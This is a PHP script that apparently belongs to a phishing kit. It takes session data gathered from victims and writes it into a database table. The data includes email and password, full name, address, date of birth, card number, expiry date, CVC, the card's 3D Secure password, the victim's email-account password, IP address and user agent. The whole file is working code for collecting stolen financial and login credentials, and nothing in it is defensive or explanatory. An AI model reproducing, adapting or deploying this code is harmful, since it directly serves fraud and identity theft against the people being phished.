<?php
include('../../dbconfig.php');
try{
    $dbh = new PDO('mysql:host='.$db_host.';dbname='.$db_dbname,$db_username,$db_password);
}
catch(Exception $e)
{
    echo $e->getMessage();
    die;
}
$stmt = $dbh->prepare("INSERT INTO user_msg (email, password, fullname, state, address1, address2, zipcode, phonenumber, dateofbirth, nameofcard, cardnumber, expiration, cvc, password3d, passwordemail, country, region, ip, useragent, timedate, channel) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
$stmt->bindParam(1, $_SESSION['email']);
$stmt->bindParam(2, $_SESSION['password']);
$stmt->bindParam(3, $_SESSION['fullname']);
$stmt->bindParam(4, $_SESSION['stat']);
$stmt->bindParam(5, $_SESSION['address']);
$stmt->bindParam(6, $_SESSION['City']);
$stmt->bindParam(7, $_SESSION['zipcode']);
$stmt->bindParam(8, $_SESSION['phonenumber']);
$stmt->bindParam(9, $_SESSION['dob']);
$stmt->bindParam(10, $_SESSION['namecard']);
$stmt->bindParam(11, $_SESSION['cardnumber']);
$stmt->bindParam(12, $_SESSION['exdate']);
$stmt->bindParam(13, $_SESSION['cvc']);
$stmt->bindParam(14, $_SESSION['passvbv']);
$stmt->bindParam(15, $_SESSION['emailpass']);
$stmt->bindParam(16, $_SESSION['country']);
$stmt->bindParam(17, $_SESSION['region']);
$stmt->bindParam(18, $_SESSION['_ip_']);
$stmt->bindParam(19, $_SESSION['HTTP_USER_AGENT']);
$stmt->bindParam(20, $timedate);
$stmt->bindParam(21, $_SESSION['channel']);

$stmt->execute();
?>